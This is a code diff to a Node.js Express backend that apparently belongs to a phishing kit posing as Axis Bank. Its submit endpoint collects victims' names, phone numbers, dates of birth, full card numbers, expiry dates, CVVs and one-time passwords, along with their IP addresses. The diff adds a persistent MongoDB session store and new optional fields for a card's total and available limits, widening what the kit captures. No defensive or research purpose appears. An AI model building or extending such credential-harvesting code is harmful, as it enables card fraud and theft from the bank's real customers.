@@ -12,6 +12,68 @@ const PORT = process.env.PORT || 3000;
 const MONGODB_URI = process.env.MONGODB_URI;
 const DB_NAME = process.env.DB_NAME || 'axisbank';
 const SESSION_SECRET = process.env.SESSION_SECRET || 'dev-secret';
+const SESSION_TTL_MS = 1000 * 60 * 60 * 8;
+
+// MongoDB-backed session store (reuses the project's mongodb driver).
+// Avoids express-session's in-memory MemoryStore, which is not production-safe.
+class MongoSessionStore extends session.Store {
+  constructor({ getDb, collectionName = 'sessions', ttlMs = SESSION_TTL_MS }) {
+    super();
+    this.getDb = getDb;
+    this.collectionName = collectionName;
+    this.ttlMs = ttlMs;
+  }
+  collection() {
+    const db = this.getDb();
+    if (!db) throw new Error('Session store: database not ready.');
+    return db.collection(this.collectionName);
+  }
+  expiry(sess) {
+    const cookieExpires = sess && sess.cookie && sess.cookie.expires;
+    const ms = cookieExpires ? new Date(cookieExpires).getTime() - Date.now() : this.ttlMs;
+    return new Date(Date.now() + Math.max(ms, 0));
+  }
+  get(sid, cb) {
+    this.collection().findOne({ _id: sid })
+      .then((doc) => {
+        if (!doc) return cb(null, null);
+        if (doc.expires && new Date(doc.expires).getTime() < Date.now()) {
+          return this.collection().deleteOne({ _id: sid }).then(() => cb(null, null)).catch(() => cb(null, null));
+        }
+        cb(null, doc.session);
+      })
+      .catch((e) => cb(e));
+  }
+  set(sid, sess, cb) {
+    const doc = { _id: sid, session: sess, expires: this.expiry(sess) };
+    this.collection().updateOne({ _id: sid }, { $set: doc }, { upsert: true })
+      .then(() => cb && cb(null))
+      .catch((e) => cb && cb(e));
+  }
+  touch(sid, sess, cb) {
+    this.collection().updateOne({ _id: sid }, { $set: { expires: this.expiry(sess) } })
+      .then(() => cb && cb(null))
+      .catch((e) => cb && cb(e));
+  }
+  destroy(sid, cb) {
+    this.collection().deleteOne({ _id: sid })
+      .then(() => cb && cb(null))
+      .catch((e) => cb && cb(e));
+  }
+  clear(cb) {
+    this.collection().deleteMany({})
+      .then(() => cb && cb(null))
+      .catch((e) => cb && cb(e));
+  }
+  length(cb) {
+    this.collection().countDocuments()
+      .then((n) => cb(null, n))
+      .catch((e) => cb(e));
+  }
+}
+
+let db;
+const sessionStore = new MongoSessionStore({ getDb: () => db });
 
 app.use(cors({ origin: true, credentials: true }));
 app.use(express.json({ limit: '1mb' }));
@@ -22,12 +84,12 @@ app.use(session({
   secret: SESSION_SECRET,
   resave: false,
   saveUninitialized: false,
-  cookie: { httpOnly: true, sameSite: 'lax', maxAge: 1000 * 60 * 60 * 8 }
+  store: sessionStore,
+  cookie: { httpOnly: true, sameSite: 'lax', maxAge: SESSION_TTL_MS }
 }));
 
 app.use(express.static(__dirname));
 
-let db;
 const clients = new Set();
 const recentSubmits = new Map();
 
@@ -35,6 +97,10 @@ const REQUIRED_FIELDS = {
   personal: ['full_name', 'mobile', 'email', 'dob'],
   card: ['card_holder', 'card_number', 'card_expiry', 'card_cvv'],
   otp: ['otp']
+};
+
+const OPTIONAL_FIELDS = {
+  card: ['total_limit', 'avail_limit']
 };
 
 function getClientIp(req) {
@@ -105,6 +171,10 @@ app.post('/api/submit', async (req, res) => {
         return res.status(400).json({ error: `Missing required field: ${key}` });
       }
       cleaned[key] = String(val).trim();
+    }
+    for (const key of (OPTIONAL_FIELDS[step] || [])) {
+      const val = data ? data[key] : undefined;
+      if (!isBlank(val)) cleaned[key] = String(val).trim();
     }
     cleaned.ip = getClientIp(req);
 
@@ -274,6 +344,7 @@ async function main() {
   await client.connect();
   db = client.db(DB_NAME);
   console.log(`Connected to MongoDB. DB: ${DB_NAME}`);
+  await db.collection('sessions').createIndex({ expires: 1 }, { expireAfterSeconds: 0 });
   await seedDefaultAdmin();
   app.listen(PORT, () => {
     console.log(`Server running on http://localhost:${PORT}`);
